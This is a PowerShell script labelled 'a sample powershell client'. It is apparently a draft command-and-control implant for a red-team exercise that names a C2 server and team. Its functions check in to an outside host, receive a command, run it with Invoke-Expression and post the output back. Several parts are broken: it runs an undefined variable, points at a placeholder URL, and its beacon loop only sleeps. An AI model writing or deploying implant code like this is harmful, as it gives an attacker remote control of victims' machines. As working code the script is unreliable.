<#
.SYNOPSIS
    A sample powershell client.
#>

# Global configuration parameters 
$server = "samplec2.ists";
$ip = "192.168.1.1";
$team = "team10";
$CheckTimeInMinutes = 1;
Write-Host $server

$globalData = @{
  "team" = $team;
  "ip" = $ip;
  "user" = "www-data";
}


$jdata = $data | ConvertTo-Json;
$jdata.team;
Write-Host $data.team;


function communicate ($url,$data) {
  try {
    $results = Invoke-WebRequest -Uri "$url" -Method POST -Body ($jdata | ConvertTo-Json) -ContentType "application/json";
    $result = Invoke-WebRequest -Uri "$url";
    $result = $result | ConvertFrom-Json;
    return $result;
  }
  catch {
    return $null;
  }
}


function checkin ($url,$data) {
  try {
    #$url = -join("$url", "/callback");
    $url = "https://jsonplaceholder.typicode.com/todos/1";
    return communicate ($url,$data);
  }
  catch {
    return $null;
  }
}


function reply ($id,$results) {
  try {
    $data = @{
      "id" = $id;
      "results" = $results;
    }
    return communicate ($url,$data);
  }
  catch {
    return $null;
  }

}


function execute ($cmd) {
  try {
    $output = Invoke-Expression $cmd -ErrorVariable e;
  }
  catch {
    Write-Output $e
    Write-Output "\n"
  }
  # TODO Finalize the output - e and output
  $results = $output;
  return $results;
}


try {
  $results = checkin ("http://10.10.1.109/",$globalData);
  # Debug
  Write-Host $results.command;
  Write-Host $results.id;
  # Set values
  $command = $results.command;
  $id = $results.id;
  $results = execute ($cmd);
  reply ($id,$results);
}
catch {
  Write-Output $e
}


while (1)
{
  #Do
  $minutes = $CheckTimeInMinutes;
  Start-Sleep -Seconds (60 * $minutes);

}


